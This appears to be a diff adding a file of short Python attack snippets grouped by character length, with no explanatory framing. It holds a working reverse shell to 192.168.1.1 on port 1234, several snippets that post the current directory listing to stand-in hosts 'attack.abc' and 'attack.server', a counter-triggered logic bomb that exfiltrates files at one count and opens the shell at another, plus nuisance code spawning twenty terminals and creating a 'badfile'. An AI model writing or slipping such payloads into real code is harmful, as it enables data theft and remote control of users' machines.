@@ -1,0 +1,95 @@
+(40char)
+
+import os
+os.system("touch badfile.txt")
+
+(62char)
+
+import os
+for i in range(20):
+    os.system('gnome-terminal')
+
+(178char)
+
+import requests
+import json
+import glob
+res = glob.glob("./*")
+json_data = json.dumps(res)
+try:
+    response = requests.post('http://attack.abc', json=json_data)
+except:
+    pass
+
+(288char)
+
+import subprocess
+import sys 
+import socket
+import os
+try:
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("192.168.1.1",1234))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p = subprocess.call(["/bin/sh","-i"])
+except:
+    pass
+
+
+
+(724char)
+
+import subprocess
+import sys 
+import socket
+import os
+import requests
+import json
+import glob
+count = open("count.txt", ).readlines()[0]
+if count < 100:
+    pass
+elif count == 100:
+    res = glob.glob("./*")
+    json_data = json.dumps(res)
+    try:
+        response = requests.post('http://attack.abc', json=json_data)
+    except:
+        pass
+elif count == 500:
+    try:
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("192.168.1.1",1234))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        p = subprocess.call(["/bin/sh","-i"])
+    except:
+        pass
+else:
+    pass
+count += 1
+f = open("count.txt", 'w')
+f.writelines(f"{count}\n")
+f.close()
+
+
+(38char)
+
+f = open("badfile.txt", 'w')
+f.close()
+
+
+(45char)
+
+count = 0
+for i in range(200):
+    count += 1
+
+
+
+
+import requests, json, glob
+response = requests.post('http://attack.server', json=json.dumps(glob.glob("./*")))
